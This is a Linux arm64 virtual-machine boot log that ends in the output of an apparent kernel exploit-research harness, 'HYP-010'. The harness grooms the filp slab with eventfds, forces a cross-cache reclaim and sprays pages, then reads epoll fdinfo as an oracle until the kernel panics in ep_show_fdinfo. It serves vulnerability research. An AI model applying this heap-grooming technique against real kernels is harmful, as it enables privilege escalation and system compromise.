[    0.000000][    T0] Booting Linux on physical CPU 0x0000000000 [0x411fd070]
[    0.000000][    T0] Linux version 6.1.23-gf818e9d9e953-dirty (legion@hpelitebook840g5) (aarch64-linux-musl-gcc (GCC) 11.2.1 20211120, GNU ld (GNU Binutils) 2.37) #4 SMP PREEMPT Mon Sep  7 11:41:12 IST 2026
[    0.000000][    T0] random: crng init done
[    0.000000][    T0] Machine model: linux,dummy-virt
[    0.000000][    T0] Stack Depot is disabled
[    0.000000][    T0] KVM is not available. Ignoring kvm-arm.mode
[    0.000000][    T0] earlycon: pl11 at MMIO 0x0000000009000000 (options '')
[    0.000000][    T0] printk: bootconsole [pl11] enabled
[    0.000000][    T0] efi: UEFI not found.
[    0.000000][    T0] Zone ranges:
[    0.000000][    T0]   DMA32    [mem 0x0000000040000000-0x00000000bfffffff]
[    0.000000][    T0]   Normal   empty
[    0.000000][    T0]   Device   empty
[    0.000000][    T0] Movable zone start for each node
[    0.000000][    T0] Early memory node ranges
[    0.000000][    T0]   node   0: [mem 0x0000000040000000-0x00000000bfffffff]
[    0.000000][    T0] Initmem setup node 0 [mem 0x0000000040000000-0x00000000bfffffff]
[    0.000000][    T0] cma: Reserved 16 MiB at 0x00000000bc800000
[    0.000000][    T0] psci: probing for conduit method from DT.
[    0.000000][    T0] psci: PSCIv1.1 detected in firmware.
[    0.000000][    T0] psci: Using standard PSCI v0.2 function IDs
[    0.000000][    T0] psci: Trusted OS migration not required
[    0.000000][    T0] psci: SMC Calling Convention v1.0
[    0.000000][    T0] 'bootconfig' found on command line, but no bootconfig found
[    0.000000][    T0] percpu: Embedded 29 pages/cpu s80808 r8192 d29784 u118784
[    0.000000][    T0] Detected PIPT I-cache on CPU0
[    0.000000][    T0] CPU features: SYS_ID_AA64MMFR1_EL1[11:8]: already set to 0
[    0.000000][    T0] CPU features: detected: Spectre-v2
[    0.000000][    T0] CPU features: detected: Spectre-v3a
[    0.000000][    T0] CPU features: detected: Spectre-v4
[    0.000000][    T0] CPU features: detected: Spectre-BHB
[    0.000000][    T0] CPU features: detected: ARM erratum 834220
[    0.000000][    T0] CPU features: detected: ARM erratum 1742098
[    0.000000][    T0] CPU features: detected: ARM erratum 832075
[    0.000000][    T0] CPU features: detected: ARM errata 1165522, 1319367, or 1530923
[    0.000000][    T0] alternatives: applying boot alternatives
[    0.000000][    T0] Built 1 zonelists, mobility grouping on.  Total pages: 516096
[    0.000000][    T0] Kernel command line: console=ttynull stack_depot_disable=on cgroup_disable=pressure kasan.page_alloc.sample=10 kasan.stacktrace=off kvm-arm.mode=protected bootconfig ioremap_guard console=ttyAMA0 root=/dev/ram0 kasan=off nokaslr earlycon=pl011,0x09000000 printk.devkmsg=on isolcpus=1 nohz_full=1 rcu_nocbs=1 rw
[    0.000000][    T0] cgroup: Disabling pressure control group feature
[    0.000000][    T0] Housekeeping: nohz unsupported. Build with CONFIG_NO_HZ_FULL
[    0.000000][    T0] Unknown kernel command line parameters "nokaslr nohz_full=1", will be passed to user space.
[    0.000000][    T0] Dentry cache hash table entries: 262144 (order: 9, 2097152 bytes, linear)
[    0.000000][    T0] Inode-cache hash table entries: 131072 (order: 8, 1048576 bytes, linear)
[    0.000000][    T0] mem auto-init: stack:off, heap alloc:on, heap free:off
[    0.000000][    T0] Memory: 1988944K/2097152K available (15296K kernel code, 1850K rwdata, 14860K rodata, 3136K init, 598K bss, 91824K reserved, 16384K cma-reserved)
[    0.000000][    T0] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1
[    0.000000][    T0] trace event string verifier disabled
[    0.000000][    T0] rcu: Preemptible hierarchical RCU implementation.
[    0.000000][    T0] rcu: 	RCU event tracing is enabled.
[    0.000000][    T0] rcu: 	RCU restricting CPUs from NR_CPUS=32 to nr_cpu_ids=2.
[    0.000000][    T0] rcu: 	RCU priority boosting: priority 1 delay 500 ms.
[    0.000000][    T0] 	Trampoline variant of Tasks RCU enabled.
[    0.000000][    T0] 	Tracing variant of Tasks RCU enabled.
[    0.000000][    T0] rcu: RCU calculated value of scheduler-enlistment delay is 25 jiffies.
[    0.000000][    T0] rcu: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2
[    0.000000][    T0] NR_IRQS: 64, nr_irqs: 64, preallocated irqs: 0
[    0.000000][    T0] Root IRQ handler: gic_handle_irq
[    0.000000][    T0] GICv2m: range[mem 0x08020000-0x08020fff], SPI[80:143]
[    0.000000][    T0] rcu: 	Offload RCU callbacks from CPUs: 1.
[    0.000000][    T0] rcu: srcu_init: Setting srcu_struct sizes based on contention.
[    0.000000][    T0] arch_timer: cp15 timer(s) running at 62.50MHz (virt).
[    0.000000][    T0] clocksource: arch_sys_counter: mask: 0x1ffffffffffffff max_cycles: 0x1cd42e208c, max_idle_ns: 881590405314 ns
[    0.000115][    T0] sched_clock: 57 bits at 63MHz, resolution 16ns, wraps every 4398046511096ns
[    0.003645][    T0] kfence: initialized - using 524288 bytes for 63 objects at 0x(____ptrval____)-0x(____ptrval____)
[    0.015312][    T0] Calibrating delay loop (skipped), value calculated using timer frequency.. 125.00 BogoMIPS (lpj=250000)
[    0.016470][    T0] pid_max: default: 32768 minimum: 301
[    0.018237][    T0] LSM: Security Framework initializing
[    0.020177][    T0] SELinux:  Initializing.
[    0.025374][    T0] Mount-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.025825][    T0] Mountpoint-cache hash table entries: 4096 (order: 3, 32768 bytes, linear)
[    0.073633][    T1] cacheinfo: Unable to detect cache hierarchy for CPU 0
[    0.089342][    T1] cblist_init_generic: Setting adjustable number of callback queues.
[    0.089976][    T1] cblist_init_generic: Setting shift to 1 and lim to 1.
[    0.091806][    T1] cblist_init_generic: Setting shift to 1 and lim to 1.
[    0.094750][    T1] rcu: Hierarchical SRCU implementation.
[    0.095607][    T1] rcu: 	Max phase no-delay instances is 1000.
[    0.110801][    T1] dyndbg: Ignore empty _ddebug table in a CONFIG_DYNAMIC_DEBUG_CORE build
[    0.111965][    T1] EFI services will not be available.
[    0.116874][    T1] smp: Bringing up secondary CPUs ...
[    0.126416][    T0] Detected PIPT I-cache on CPU1
[    0.127269][    T0] cacheinfo: Unable to detect cache hierarchy for CPU 1
[    0.127981][    T0] CPU1: Booted secondary processor 0x0000000001 [0x411fd070]
[    0.133030][    T1] smp: Brought up 1 node, 2 CPUs
[    0.134209][    T1] SMP: Total of 2 processors activated.
[    0.134545][    T1] CPU features: detected: 32-bit EL0 Support
[    0.134803][    T1] CPU features: detected: 32-bit EL1 Support
[    0.135110][    T1] CPU features: detected: CRC32 instructions
[    0.138490][    T1] CPU features: emulated: Privileged Access Never (PAN) using TTBR0_EL1 switching
[    0.139235][    T1] CPU: All CPU(s) started at EL1
[    0.139661][    T1] alternatives: applying system-wide alternatives
[    0.177342][    T1] Registered cp15_barrier emulation handler
[    0.177819][    T1] Registered setend emulation handler
[    0.179716][    T1] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 7645041785100000 ns
[    0.180619][    T1] futex hash table entries: 512 (order: 3, 32768 bytes, linear)
[    0.189241][    T1] pinctrl core: initialized pinctrl subsystem
[    0.216016][    T1] NET: Registered PF_NETLINK/PF_ROUTE protocol family
[    0.245925][    T1] DMA: preallocated 256 KiB GFP_KERNEL pool for atomic allocations
[    0.247447][    T1] DMA: preallocated 256 KiB GFP_KERNEL|GFP_DMA32 pool for atomic allocations
[    0.248603][    T1] audit: initializing netlink subsys (disabled)
[    0.256869][   T30] audit: type=2000 audit(0.220:1): state=initialized audit_enabled=0 res=1
[    0.260867][    T1] thermal_sys: Registered thermal governor 'step_wise'
[    0.260952][    T1] thermal_sys: Registered thermal governor 'user_space'
[    0.261276][    T1] thermal_sys: Registered thermal governor 'power_allocator'
[    0.262025][    T1] cpuidle: using governor menu
[    0.265643][    T1] hw-breakpoint: found 6 breakpoint and 4 watchpoint registers.
[    0.267032][    T1] ASID allocator initialised with 65536 entries
[    0.268836][    T1] Serial: AMBA PL011 UART driver
[    0.306198][    T1] 9000000.pl011: ttyAMA0 at MMIO 0x9000000 (irq = 13, base_baud = 0) is a PL011 rev1
[    0.308323][    T1] printk: console [ttyAMA0] enabled
[    0.308323][    T1] printk: console [ttyAMA0] enabled
[    0.309029][    T1] printk: bootconsole [pl11] disabled
[    0.309029][    T1] printk: bootconsole [pl11] disabled
[    0.319424][    T1] KASLR disabled on command line
[    0.396183][    T1] iommu: Default domain type: Translated 
[    0.396819][    T1] iommu: DMA domain TLB invalidation policy: strict mode 
[    0.401255][    T1] SCSI subsystem initialized
[    0.403069][    T1] usbcore: registered new interface driver usbfs
[    0.403644][    T1] usbcore: registered new interface driver hub
[    0.404094][    T1] usbcore: registered new device driver usb
[    0.405622][    T1] mc: Linux media interface: v0.10
[    0.405985][    T1] videodev: Linux video capture interface: v2.00
[    0.407113][    T1] pps_core: LinuxPPS API ver. 1 registered
[    0.407334][    T1] pps_core: Software ver. 5.3.6 - Copyright 2005-2007 Rodolfo Giometti <giometti@linux.it>
[    0.407756][    T1] PTP clock support registered
[    0.408227][    T1] EDAC MC: Ver: 3.0.0
[    0.433085][    T1] Advanced Linux Sound Architecture Driver Initialized.
[    0.461555][    T1] clocksource: Switched to clocksource arch_sys_counter
[    0.469148][    T1] VFS: Disk quotas dquot_6.6.0
[    0.469848][    T1] VFS: Dquot-cache hash table entries: 512 (order 0, 4096 bytes)
[    0.484806][    T1] NET: Registered PF_INET protocol family
[    0.498683][    T1] IP idents hash table entries: 32768 (order: 6, 262144 bytes, linear)
[    0.523475][    T1] tcp_listen_portaddr_hash hash table entries: 1024 (order: 2, 16384 bytes, linear)
[    0.524133][    T1] Table-perturb hash table entries: 65536 (order: 6, 262144 bytes, linear)
[    0.524742][    T1] TCP established hash table entries: 16384 (order: 5, 131072 bytes, linear)
[    0.525943][    T1] TCP bind hash table entries: 16384 (order: 7, 524288 bytes, linear)
[    0.526641][    T1] TCP: Hash tables configured (established 16384 bind 16384)
[    0.537685][    T1] UDP hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    0.538345][    T1] UDP-Lite hash table entries: 1024 (order: 3, 32768 bytes, linear)
[    0.540336][    T1] NET: Registered PF_UNIX/PF_LOCAL protocol family
[    0.541187][    T1] NET: Registered PF_XDP protocol family
[    0.541850][    T1] PCI: CLS 0 bytes, default 64
[    0.552519][    T8] Trying to unpack rootfs image as initramfs...
[    0.577696][    T1] hw perfevents: enabled with armv8_pmuv3 PMU driver, 7 counters available
[    0.579118][    T1] kvm [1]: HYP mode not available
[    0.584923][    T1] Initialise system trusted keyrings
[    0.610026][    T1] workingset: timestamp_bits=46 max_order=19 bucket_order=0
[    0.708154][    T1] fuse: init (API version 7.37)
[    0.899528][    T1] Key type asymmetric registered
[    0.900005][    T1] Asymmetric key parser 'x509' registered
[    0.900635][    T1] Block layer SCSI generic (bsg) driver version 0.4 loaded (major 239)
[    0.910665][    T8] Freeing initrd memory: 14040K
[    0.911885][    T1] io scheduler mq-deadline registered
[    0.912231][    T1] io scheduler kyber registered
[    0.913600][    T1] io scheduler bfq registered
[    0.922690][    T1] pl061_gpio 9030000.pl061: PL061 GPIO chip registered
[    0.925062][    T1] pci-host-generic 4010000000.pcie: host bridge /pcie@10000000 ranges:
[    0.929564][    T1] pci-host-generic 4010000000.pcie:       IO 0x003eff0000..0x003effffff -> 0x0000000000
[    0.930714][    T1] pci-host-generic 4010000000.pcie:      MEM 0x0010000000..0x003efeffff -> 0x0010000000
[    0.931203][    T1] pci-host-generic 4010000000.pcie:      MEM 0x8000000000..0xffffffffff -> 0x8000000000
[    0.932273][    T1] pci-host-generic 4010000000.pcie: Memory resource size exceeds max for 32 bits
[    0.933469][    T1] pci-host-generic 4010000000.pcie: ECAM at [mem 0x4010000000-0x401fffffff] for [bus 00-ff]
[    0.935342][    T1] pci-host-generic 4010000000.pcie: PCI host bridge to bus 0000:00
[    0.935936][    T1] pci_bus 0000:00: root bus resource [bus 00-ff]
[    0.936263][    T1] pci_bus 0000:00: root bus resource [io  0x0000-0xffff]
[    0.936595][    T1] pci_bus 0000:00: root bus resource [mem 0x10000000-0x3efeffff]
[    0.936854][    T1] pci_bus 0000:00: root bus resource [mem 0x8000000000-0xffffffffff]
[    0.939361][    T1] pci 0000:00:00.0: [1b36:0008] type 00 class 0x060000
[    0.944880][    T1] pci 0000:00:01.0: [1af4:1000] type 00 class 0x020000
[    0.945656][    T1] pci 0000:00:01.0: reg 0x10: [io  0x0000-0x001f]
[    0.945944][    T1] pci 0000:00:01.0: reg 0x14: [mem 0x00000000-0x00000fff]
[    0.946276][    T1] pci 0000:00:01.0: reg 0x20: [mem 0x00000000-0x00003fff 64bit pref]
[    0.946694][    T1] pci 0000:00:01.0: reg 0x30: [mem 0x00000000-0x0003ffff pref]
[    0.950815][    T1] pci 0000:00:01.0: BAR 6: assigned [mem 0x10000000-0x1003ffff pref]
[    0.951476][    T1] pci 0000:00:01.0: BAR 4: assigned [mem 0x8000000000-0x8000003fff 64bit pref]
[    0.951931][    T1] pci 0000:00:01.0: BAR 1: assigned [mem 0x10040000-0x10040fff]
[    0.952229][    T1] pci 0000:00:01.0: BAR 0: assigned [io  0x1000-0x101f]
[    0.961515][    T1] printk: console [ttynull0] enabled
[    0.963473][   T22] cacheinfo: Unable to detect cache hierarchy for CPU 0
[    1.007637][    T1] brd: module loaded
[    1.047054][    T1] loop: module loaded
[    1.053751][    T1] wireguard: WireGuard 1.0.0 loaded. See www.wireguard.com for information.
[    1.054096][    T1] wireguard: Copyright (C) 2015-2019 Jason A. Donenfeld <Jason@zx2c4.com>. All Rights Reserved.
[    1.057488][    T1] MACsec IEEE 802.1AE
[    1.061000][    T1] tun: Universal TUN/TAP device driver, 1.6
[    1.062085][    T1] usbcore: registered new interface driver rtl8150
[    1.062472][    T1] usbcore: registered new interface driver r8152
[    1.062808][    T1] usbcore: registered new interface driver asix
[    1.063136][    T1] usbcore: registered new interface driver ax88179_178a
[    1.063477][    T1] usbcore: registered new interface driver cdc_ether
[    1.063796][    T1] usbcore: registered new interface driver cdc_eem
[    1.064169][    T1] usbcore: registered new interface driver cdc_ncm
[    1.064508][    T1] usbcore: registered new interface driver aqc111
[    1.064844][    T1] usbcore: registered new interface driver r8153_ecm
[    1.068589][    T1] usbcore: registered new interface driver uas
[    1.069145][    T1] usbcore: registered new interface driver usb-storage
[    1.073234][    T1] usbcore: registered new interface driver xpad
[    1.088124][    T1] rtc-pl031 9010000.pl031: registered as rtc0
[    1.090409][    T1] rtc-pl031 9010000.pl031: setting system clock to 2026-09-07T09:31:44 UTC (1788773504)
[    1.093651][    T1] gspca_main: v2.14.0 registered
[    1.095041][    T1] usbcore: registered new interface driver uvcvideo
[    1.097769][    T1] device-mapper: uevent: version 1.0.3
[    1.099572][    T1] device-mapper: ioctl: 4.47.0-ioctl (2022-07-28) initialised: dm-devel@redhat.com
[    1.104643][    T1] sdhci: Secure Digital Host Controller Interface driver
[    1.104889][    T1] sdhci: Copyright(c) Pierre Ossman
[    1.105059][    T1] sdhci-pltfm: SDHCI platform and OF driver helper
[    1.106722][    T1] hid: raw HID events driver (C) Jiri Kosina
[    1.114523][    T1] usbcore: registered new interface driver usbhid
[    1.114765][    T1] usbhid: USB HID core driver
[    1.115803][    T1] ashmem: initialized
[    1.117554][    T1] gnss: GNSS driver registered with major 506
[    1.120012][    T1] usbcore: registered new interface driver snd-usb-audio
[    1.123256][    T1] GACT probability NOT on
[    1.123882][    T1] Mirror/redirect action on
[    1.124539][    T1] netem: version 1.3
[    1.124967][    T1] u32 classifier
[    1.125087][    T1]     input device check on
[    1.125230][    T1]     Actions configured
[    1.240080][    T1] xt_time: kernel timezone is -0000
[    1.240696][    T1] ipip: IPv4 and MPLS over IPv4 tunneling driver
[    1.243757][    T1] gre: GRE over IPv4 demultiplexor driver
[    1.244045][    T1] ip_gre: GRE over IPv4 tunneling driver
[    1.248651][    T1] IPv4 over IPsec tunneling driver
[    1.252644][    T1] Initializing XFRM netlink socket
[    1.253168][    T1] IPsec XFRM device driver
[    1.255633][    T1] NET: Registered PF_INET6 protocol family
[    1.269986][    T1] Segment Routing with IPv6
[    1.270389][    T1] In-situ OAM (IOAM) with IPv6
[    1.271796][    T1] mip6: Mobile IPv6
[    1.275870][    T1] sit: IPv6, IPv4 and MPLS over IPv4 tunneling driver
[    1.281950][    T1] ip6_gre: GRE over IPv6 tunneling driver
[    1.285247][    T1] NET: Registered PF_PACKET protocol family
[    1.285866][    T1] NET: Registered PF_KEY protocol family
[    1.287275][    T1] NET: Registered PF_VSOCK protocol family
[    1.291163][    T1] registered taskstats version 1
[    1.291842][    T1] Loading compiled-in X.509 certificates
[    1.318291][    T1] Loaded X.509 cert 'Build time autogenerated kernel key: 14e41adaf06b936a10f02b8132e23651e6ae330c'
[    1.319312][    T1] page_owner is disabled
[    1.320490][    T1] Key type .fscrypt registered
[    1.320670][    T1] Key type fscrypt-provisioning registered
[    1.322085][   T54] cryptomgr_probe (54) used greatest stack depth: 15024 bytes left
[    1.335947][    T1] input: gpio-keys as /devices/platform/gpio-keys/input/input0
[    1.348744][    T1] ALSA device list:
[    1.349016][    T1]   No soundcards found.
[    1.356359][    T1] uart-pl011 9000000.pl011: no DMA platform data
[    1.423499][    T1] Freeing unused kernel memory: 3136K
[    1.424831][    T1] Run /init as init process
[    1.472152][    T1] request_module fs-devtmpfs succeeded, but still no fs?
[*] Init: Starting harness on virtio console...
========================================================
=== HYP-010 Part B: Victim-Sandwich Reclaim (Forced) ===
========================================================
[*] Initial /sys/kernel/slab/filp/slabs = 1
[*] Allocating background pressure files (4,000 eventfds)...
[*] Peak /sys/kernel/slab/filp/slabs after pressure = 251
[*] Sandwiched inner fd=4036 (orig inode=0x3e) between Batch A (32 fds) and Batch B (32 fds)
[HYP-010] MARKER: setup_done epA=4003 inner=4036
[HYP-010] MARKER: close_started
[HYP-010] MARKER: close_done
[*] Freeing Batch A and Batch B enclosing files on victim's slab...
[*] Freeing background pressure files...
[*] Waiting 2.0s for RCU grace period and SLUB slab release...
[*] Post-drain /sys/kernel/slab/filp/slabs = 9 (drop: 251 -> 9, delta=242)
[HYP-010] MARKER: sandwich_freed slabs_before=251 slabs_after=9
[+] Cross-cache signal CONFIRMED: filp slab count dropped significantly!
[*] Spray Round 1: Allocating 256 MB (65536 pages)...
[HYP-010] MARKER: spray_round_done round=1 total_mb=256
[*] Round 1 Oracle Read (res=0, item ino=0x3e):
pos:	0
flags:	02
mnt_id:	12
ino:	62
tfd:     4036 events:       1d data:              fc4  pos:0 ino:3e sdev:d

[*] Spray Round 2: Allocating 256 MB (65536 pages)...
[HYP-010] MARKER: spray_round_done round=2 total_mb=512
[*] Round 2 Oracle Read (res=0, item ino=0x3e):
pos:	0
flags:	02
mnt_id:	12
ino:	62
tfd:     4036 events:       1d data:              fc4  pos:0 ino:3e sdev:d

[*] Spray Round 3: Allocating 256 MB (65536 pages)...
[HYP-010] MARKER: spray_round_done round=3 total_mb=768
[   33.523825][   T57] Unable to handle kernel paging request at virtual address 00e800006bb61f6b
[   33.524529][   T57] Mem abort info:
[   33.524781][   T57]   ESR = 0x0000000096000004
[   33.525133][   T57]   EC = 0x25: DABT (current EL), IL = 32 bits
[   33.525757][   T57]   SET = 0, FnV = 0
[   33.526027][   T57]   EA = 0, S1PTW = 0
[   33.526372][   T57]   FSC = 0x04: level 0 translation fault
[   33.526760][   T57] Data abort info:
[   33.527087][   T57]   ISV = 0, ISS = 0x00000004
[   33.527396][   T57]   CM = 0, WnR = 0
[   33.527703][   T57] [00e800006bb61f6b] address between user and kernel address ranges
[   33.528470][   T57] Internal error: Oops: 0000000096000004 [#1] PREEMPT SMP
[   33.529176][   T57] Modules linked in:
[   33.529565][   T57] CPU: 0 PID: 57 Comm: harness Not tainted 6.1.23-gf818e9d9e953-dirty #4
[   33.529892][   T57] Hardware name: linux,dummy-virt (DT)
[   33.530352][   T57] pstate: 80400005 (Nzcv daif +PAN -UAO -TCO -DIT -SSBS BTYPE=--)
[   33.530666][   T57] pc : ep_show_fdinfo+0x60/0xa4
[   33.530915][   T57] lr : ep_show_fdinfo+0x24/0xa4
[   33.531104][   T57] sp : ffffffc00a663b90
[   33.531271][   T57] x29: ffffffc00a663b90 x28: 0000000000000001 x27: 0000000000400cc0
[   33.531625][   T57] x26: ffffff8002935ec0 x25: ffffff800524f200 x24: 0000000000000002
[   33.531899][   T57] x23: ffffff8004ace130 x22: ffffff8004a9a600 x21: ffffffc0096ed028
[   33.532203][   T57] x20: ffffff8004b0f3c0 x19: ffffff8005254d80 x18: 0000000000000000
[   33.532463][   T57] x17: 0000000000000000 x16: 0000000000000000 x15: 000000000000003e
[   33.532745][   T57] x14: 0000000000000000 x13: ffffffffffffffff x12: ffffffffffffffff
[   33.533019][   T57] x11: ffffff8004ac4000 x10: 000000000000000a x9 : 0000000000000000
[   33.533379][   T57] x8 : 000000000000000a x7 : 093a64695f746e6d x6 : 000000000000000a
[   33.533660][   T57] x5 : 00e800006bb6af43 x4 : 00e800006bb61f43 x3 : 000000000000001d
[   33.533931][   T57] x2 : 0000000000000fc4 x1 : ffffffc0096ed028 x0 : ffffff8004b0f3c0
[   33.534403][   T57] Call trace:
[   33.534669][   T57]  ep_show_fdinfo+0x60/0xa4
[   33.534994][   T57]  seq_show+0x170/0x220
[   33.535263][   T57]  seq_read_iter+0x1cc/0x4e0
[   33.535528][   T57]  seq_read+0x84/0xc0
[   33.535739][   T57]  vfs_read+0xc0/0x2a0
[   33.535953][   T57]  ksys_read+0x68/0xf4
[   33.536323][   T57]  __arm64_sys_read+0x1c/0x2c
[   33.536574][   T57]  invoke_syscall+0x48/0x114
[   33.536889][   T57]  el0_svc_common.constprop.0+0x44/0xfc
[   33.537225][   T57]  do_el0_svc+0x30/0xd0
[   33.537529][   T57]  el0_svc+0x2c/0xb0
[   33.537791][   T57]  el0t_64_sync_handler+0xbc/0x140
[   33.538133][   T57]  el0t_64_sync+0x19c/0x1a0
[   33.539025][   T57] Code: aa1403e0 b9406a63 f94010a4 f94034a5 (f9401487) 
[   33.539925][   T57] ---[ end trace 0000000000000000 ]---
[   33.540758][   T57] Kernel panic - not syncing: Oops: Fatal exception
[   33.541892][   T57] SMP: stopping secondary CPUs
[   33.543852][   T57] Kernel Offset: disabled
[   33.544369][   T57] CPU features: 0x22000,2023c080,0000421b
[   33.545061][   T57] Memory Limit: none
